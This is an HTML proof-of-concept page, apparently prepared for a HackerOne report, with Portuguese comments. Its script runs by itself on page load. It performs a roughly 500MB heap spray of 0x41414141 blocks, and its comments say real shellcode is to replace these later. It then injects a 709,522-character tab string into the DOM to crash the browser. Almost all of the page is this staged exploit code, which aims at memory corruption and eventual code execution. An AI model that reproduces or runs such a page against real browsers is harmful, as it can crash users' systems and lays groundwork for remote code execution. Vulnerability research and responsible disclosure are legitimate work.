<!DOCTYPE html>
<html>
<head>
    <title>PoC HackerOne Refined: Spray + Crash</title>
    <style>
        body { background-color: #000; color: #ff0000; font-family: monospace; }
        .log { border: 1px solid #555; padding: 10px; margin-top: 20px; color: #0f0; }
    </style>
</head>
<body>
    <h1>TARGET: 709,522 Bytes Trigger</h1>
    <h3>Status: Preparando Heap Spray...</h3>
    <div id="logArea" class="log"></div>

    <script>
        // CONFIGURAÇÃO DA SUA POC ORIGINAL
        // Mantenha o tamanho exato que causa o crash
        const TRIGGER_SIZE = 709522; 
        
        // O caractere que causa a falha (0x09 = TAB, 0x0C = FORM FEED)
        // Se a sua POC original usa outro, altere aqui.
        const TRIGGER_CHAR = String.fromCharCode(0x09); 

        const logger = document.getElementById('logArea');
        function log(msg) { logger.innerHTML += "<div>[+] " + msg + "</div>"; }

        // --- PASSO 1: HEAP SPRAY ---
        // O objetivo é encher a memória RAM com dados conhecidos (0x41414141...)
        // Se o crash desviar o fluxo para um endereço aleatório, queremos que ele caia aqui.
        var spray = [];
        
        function runSpray() {
            log("Iniciando Heap Spray (Preenchendo RAM)...");
            
            try {
                // Criamos um bloco grande de dados (1MB)
                // 0x90 é NOP (No Operation) em Assembly x86/x64. 
                // É o padrão para 'deslizar' até o exploit.
                var blockSize = 1024 * 1024;
                var buffer = new ArrayBuffer(blockSize);
                var view = new Uint32Array(buffer);
                
                // Preenche com 0x90909090 (NOPs) ou 0x41414141 (As)
                for (var i = 0; i < view.length; i++) {
                    view[i] = 0x41414141; // Substituir por Shellcode real futuramente
                }

                // Aloca 500MB de memória com esse padrão
                for (var i = 0; i < 500; i++) {
                    spray.push(buffer.slice(0)); 
                }
                
                log("Heap Spray Completo: ~500MB alocados.");
                
            } catch (e) {
                log("Aviso: Memória quase cheia (Isso é bom).");
            }
            
            // Pequeno delay para garantir que a memória assentou
            setTimeout(triggerCrash, 1000);
        }

        // --- PASSO 2: O GATILHO (A SUA POC) ---
        function triggerCrash() {
            log(`Construindo String da Morte (${TRIGGER_SIZE} bytes)...`);
            
            // Constrói a string exata do report
            // Usamos array join que é mais rápido e eficiente em memória para construção
            var payload = new Array(TRIGGER_SIZE + 1).join(TRIGGER_CHAR);

            log("PAYLOAD PRONTO. EXECUTANDO EM 3 SEGUNDOS...");
            log("Se o console desligar ou der tela azul, o Spray pode ter funcionado.");

            setTimeout(() => {
                // AQUI É O PONTO CRÍTICO
                // Tentamos injetar isso onde o navegador processa (DOM ou Váriavel)
                
                // TENTATIVA A: Injeção no DOM (Renderização)
                var div = document.createElement('div');
                div.innerHTML = payload; 
                document.body.appendChild(div);

                // TENTATIVA B (Se A não crashar): Manipulação de String pura
                // var crash = payload.trim(); // Força processamento
                // var len = payload.split(TRIGGER_CHAR).length;

            }, 3000);
        }

        // Inicia o processo automaticamente
        setTimeout(runSpray, 1500);

    </script>
</body>
</html>
